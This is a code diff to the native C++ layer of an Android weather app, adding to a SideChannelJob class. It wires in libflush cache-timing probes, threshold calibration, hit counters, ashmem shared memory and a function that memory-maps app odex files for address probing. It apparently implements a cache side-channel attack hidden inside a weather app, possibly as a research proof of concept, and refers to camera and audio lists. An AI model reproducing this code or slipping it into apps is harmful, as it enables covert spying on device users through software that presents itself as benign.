@@ -47,6 +47,8 @@ std::vector<std::string> camera_list;
 std::vector<std::string> audio_list;
 size_t *mfiles;
 
+long *buffer = NULL;
+
 struct memArea {
     int *map;
     int fd;
@@ -68,8 +70,14 @@ static int *shared_data_shm_fd;
 static int *shared_data;
 int *shared_data_ptr;
 
+int hitCounts[10] = {0};
+int pauses[100000] = {1};
+
+
 pthread_mutex_t g_lock;
 pthread_mutex_t shared_mem_lock;
+
+libflush_session_t* libflush_session;
 
 extern "C" JNIEXPORT jstring JNICALL
 Java_org_woheller69_weather_MainActivity_stringFromJNI(
@@ -99,7 +107,7 @@ Java_org_woheller69_weather_activities_RainViewerActivity_GetTimingCount(JNIEnv 
 
 extern "C" JNIEXPORT jlong JNICALL
 Java_org_woheller69_weather_activities_SplashActivity_GetTimingCount(JNIEnv *env,
-                                                                         jobject thiz) {
+                                                                     jobject thiz) {
     long lp = get_timingCount(&g_lock, &timingCount);
     LOGD("rainviewer timing count %ld", lp);
 
@@ -126,6 +134,23 @@ Java_org_woheller69_weather_activities_SplashActivity_setSharedMap(JNIEnv *env, 
     return pp1;
 }
 
+
+static void setAshMemVal(jint fd, jlong val) {
+
+    if (buffer == NULL) {
+        buffer = (long *) mmap(NULL, 128, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    }
+    buffer[0] = val;
+}
+
+static jlong readAshMem(jint fd) {
+
+    if (buffer == NULL) {
+        buffer = (long *) mmap(NULL, 128, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    }
+    return buffer[0];
+}
+
 extern "C"
 JNIEXPORT int JNICALL
 Java_org_woheller69_weather_activities_RainViewerActivity_getSharedMapVal(JNIEnv *env,
@@ -134,6 +159,46 @@ Java_org_woheller69_weather_activities_RainViewerActivity_getSharedMapVal(JNIEnv
     LOGD("shared_data_shm rainview ans %d", ans);
     return ans;
 }
+
+extern "C"
+JNIEXPORT int JNICALL
+Java_org_woheller69_weather_activities_SplashActivity_createAshMem(
+        JNIEnv *env,
+        jobject /* this */) {
+    int fd = open("/" ASHMEM_NAME_DEF, O_RDWR);
+
+    ioctl(fd, ASHMEM_SET_NAME, "memory");
+    ioctl(fd, ASHMEM_SET_SIZE, 128);
+
+    buffer = (long *) mmap(NULL, 128, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    return fd;
+}
+
+extern "C" JNIEXPORT long JNICALL
+Java_org_woheller69_weather_activities_SplashActivity_readAshMem(
+        JNIEnv *env,
+        jobject thiz, jint fd) {
+
+    return readAshMem(fd);
+
+//    if (buffer == NULL) {
+//        buffer = (long *) mmap(NULL, 128, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+//    }
+//    return buffer[0];
+}
+
+extern "C" JNIEXPORT void JNICALL
+Java_org_woheller69_weather_activities_SplashActivity_setAshMemVal(
+        JNIEnv *env,
+        jobject thiz, jint fd, jlong val) {
+
+    setAshMemVal(fd, val);
+//    if (buffer == NULL) {
+//        buffer = (long *) mmap(NULL, 128, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+//    }
+//    buffer[0] = val;
+}
+
 
 /*
 This file contains interface functions with java, such as
@@ -305,137 +370,10 @@ Java_org_woheller69_weather_SideChannelJob_scan(
 }
 
 
-extern "C" JNIEXPORT void JNICALL
-Java_org_woheller69_weather_SideChannelJob_scan1(
-        JNIEnv *env,
-        jobject thiz, jintArray ptfilter, jint length) {
-    int *arrp = env->GetIntArrayElements(ptfilter, 0);
-
-//    hit2(arrp, length, threshold);
-    //running = 0;
-    LOGD("Finished scanning %d", running);
-    return;
-}
-
-
-extern "C" JNIEXPORT void JNICALL
-Java_org_woheller69_weather_SideChannelJob_scan3(
-        JNIEnv *env,
-        jobject thiz, jobjectArray stringArray, jint length) {
-//    LOGD("scanning started 3333");
-    int stringCount = env->GetArrayLength(stringArray);
-//    std::vector<std::string> names;
-    const char *param1[stringCount];
-    for (int i = 0; i < stringCount; i++) {
-        jobject elem = env->GetObjectArrayElement(stringArray, i);
-//        jsize length = env->GetStringLength(elem);
-//        const jchar *str = env->GetStringChars(elem, nullptr);
-//        names.push_back(std::string(str, length));
-//        env->ReleaseStringChars(elem, str);
-
-//        jstring string = (jstring) (env->GetObjectArrayElement(stringArray, i));
-//        const char *rawString = env->GetStringUTFChars(string, 0);
-//        LOGD("weather:AddressScan2: scan3 %s", string);
-
-        jstring string = (jstring) (env->GetObjectArrayElement(stringArray, i));
-        const char *rawString = env->GetStringUTFChars(string, 0);
-//        LOGD("weather:AddressScan2: scan3 %s", string);
-
-
-        param1[i] = rawString;
-//        env->ReleaseStringUTFChars(string, rawString);
-
-        // Don't forget to call `ReleaseStringUTFChars` when you're done.
-    }
-
-//
-//
-//    for (int i=0; i<stringCount; i++) {
-//        jstring string = (jstring) (env->GetObjectArrayElement(stringArray, i));
-////        (*env)->ReleaseStringUTFChars(env, prompt, string)
-////        param[i] = (*env).GetStringUTFChars( string, NULL);
-//        // Don't forget to call `ReleaseStringUTFChars` when you're done.
-//    }
-
-//    hit2(const_cast<char **>(param1), length, threshold);
-//    for (int i=0; i<stringCount; i++) {
-//        (*env)->ReleaseStringUTFChars(env, param1[0])
-//    }
-    //running = 0;
-    LOGD("Finished scanning %d", running);
-    return;
-}
-
-extern "C" JNIEXPORT void JNICALL
-Java_org_woheller69_weather_SideChannelJob_scan4(
-        JNIEnv *env,
-        jobject thiz, jlongArray arr, jint length) {
-
-    jlong *c_array;
-    jint i = 0;
-
-    // get a pointer to the array
-    c_array = (env)->GetLongArrayElements(arr, 0);
-
-    // do some exception checking
-    if (c_array == NULL) {
-        return; /* exception occurred */
-    }
-    // do stuff to the array
-    for (i = 1; i < length; i++) {
-//        LOGD("scan4 %lu", c_array[i]);
-        hit5(reinterpret_cast<void *>(c_array[i]), 0, 0);
-    }
-
-    // release the memory so java can have it again
-    (env)->ReleaseLongArrayElements(arr, c_array, 0);
-
-//    LOGD("Finished scanning %d",running);
-    return;
-}
-
-
-extern "C" JNIEXPORT void JNICALL
-Java_org_woheller69_weather_SideChannelJob_scan5(
-        JNIEnv *env,
-        jobject thiz, jlongArray arr, jint length) {
-
-    jlong *arrp;
-    arrp = env->GetLongArrayElements(arr, 0);
-    size_t *addr;
-    // do some exception checking
-    if (arrp == NULL) {
-        LOGD("scan4  null pointer arrp");
-
-        return; /* exception occurred */
-    }
-
-    jint i = 0;
-    for (i = 0; i < length; i++) {
-        if (arrp + i == NULL) {
-            LOGD("scan4 null %d", i);
-            break;
-        }
-//        size_t target = *((size_t *) addr[i]);
-//        LOGD("scan4 %lu", arrp[i]);
-//        *(addr + i) = arrp[i];
-
-
-
-    }
-    timingCount++;
-    hit6(arrp, length, threshold, timingCount);
-
-//    LOGD("Finished scanning %d", running);
-    (env)->ReleaseLongArrayElements(arr, arrp, 0);
-
-    return;
-}
-
 extern "C" JNIEXPORT long JNICALL
 Java_org_woheller69_weather_SideChannelJob_scan7(
         JNIEnv *env,
-        jobject thiz, jlongArray arr, jint length) {
+        jobject thiz, jlongArray arr, jint length, jint pauseVal, jint hitVal, jboolean resetHitCounter) {
 
     jlong *arrp;
     arrp = env->GetLongArrayElements(arr, 0);
@@ -472,13 +410,43 @@ Java_org_woheller69_weather_SideChannelJob_scan7(
 
 //    set_shared_mem_val(shared_data_ptr, timingCount, &shared_mem_lock);
     hit7(arrp, length, threshold, &timingCount, times, logs, timingCounts, addresses, &log_length,
-         &g_lock);
+         &g_lock, buffer, libflush_session, hitCounts, pauses, pauseVal, hitVal, resetHitCounter);
 //    get_shared_mem_val(shared_data_ptr, &shared_mem_lock);
 //    LOGD("Finished scanning %d", running);
     (env)->ReleaseLongArrayElements(arr, arrp, 0);
 
     return timingCount;
 }
+
+
+
+
+extern "C" JNIEXPORT long JNICALL
+Java_org_woheller69_weather_SideChannelJob_readAshMem(
+        JNIEnv *env,
+        jobject thiz, jint fd) {
+
+    return readAshMem(fd);
+//    if (buffer == NULL) {
+//        buffer = (long *) mmap(NULL, 128, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+//    }
+//    return buffer[0];
+}
+
+extern "C" JNIEXPORT void JNICALL
+Java_org_woheller69_weather_SideChannelJob_setAshMemVal(
+        JNIEnv *env,
+        jobject thiz, jint fd, jlong val) {
+
+    setAshMemVal(fd, val);
+//    if (buffer == NULL) {
+//        buffer = (long *) mmap(NULL, 128, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+//    }
+//    buffer[0] = val;
+}
+
+
+
 
 extern "C" JNIEXPORT void JNICALL
 Java_org_woheller69_weather_SideChannelJob_scanOdex(
@@ -535,10 +503,10 @@ Java_org_woheller69_weather_SideChannelJob_adjustThreshold(JNIEnv *env, jobject 
 
 
     }
-    LOGD("adjust_threshold threshold before %d ", threshold);
+    LOGD("adjust_threshold1 threshold before %d ", threshold);
 
-    threshold = adjust_threshold2(arrp, length, threshold);
-    LOGD("adjust_threshold final threshold %d ", threshold);
+    threshold = adjust_threshold2(arrp, length, threshold, libflush_session);
+    LOGD("adjust_threshold1 final threshold %d ", threshold);
 
     //    LOGD("Finished scanning %d", running);
     (env)->ReleaseLongArrayElements(arr, arrp, 0);
@@ -607,7 +575,9 @@ Java_org_woheller69_weather_CacheScan_init(
 //    LOGD("Camera List: %d, Audio List: %d",length_of_camera_audio[0],length_of_camera_audio[1]);
 //    Should be enabled
     threshold = 100;
-    threshold = get_threshold();
+    libflush_init(&libflush_session, NULL);
+
+    threshold = get_threshold_wsessiom(libflush_session);
     timingCountptr = &timingCount;
 
 //    threshold = adjust_threshold(threshold, length_of_camera_audio, addr, camera_audio, &finishtrial1);//adjust threshold
@@ -693,6 +663,46 @@ static JNINativeMethod method_table[] = {
         {"setMap", "(II)V", (void *) setmap}
 
 };
+
+extern "C" JNIEXPORT jlong JNICALL
+Java_org_woheller69_weather_SideChannelJob_getOdexBegin(JNIEnv *env, jobject thiz,
+                                                             jstring fileName) {
+
+    static size_t current_length = 0;
+    void *start = NULL;
+    void *end = NULL;
+    //get all address list
+    //=================Read Offset===============================
+    std::string filename = env->GetStringUTFChars(fileName,NULL);
+    LOGD("The filename is %s", filename.c_str());
+    //map file in memory
+    int fd;
+    struct stat sb;
+    if((access(filename.c_str(),F_OK))==-1)
+    {
+        LOGD("odex Filename %s do not exists",filename.c_str());
+        return 0;
+    }
+    LOGD("odex Filename %s exists",filename.c_str());
+
+    fd = open(filename.c_str(), O_RDONLY);
+    fstat(fd, &sb);
+    LOGD("odex fd %d", fd);
+
+    unsigned char* s = (unsigned char *)mmap(0, sb.st_size, PROT_READ, MAP_SHARED, fd, 0);
+    if(s == MAP_FAILED)
+    {
+        LOGD("odex Mapping Error, file is too big or app do not have the permisson!");
+        return 0;
+        //exit(0);
+    }
+    LOGD("odex Mapping success");
+
+    LOGD("size: %d of filename %s, loaded at %p",sb.st_size,filename.c_str(),s);
+
+    return (size_t)s;
+
+}
 
 
 //extern "C" jint JNI_OnLoad(JavaVM *vm, void *reserved) {
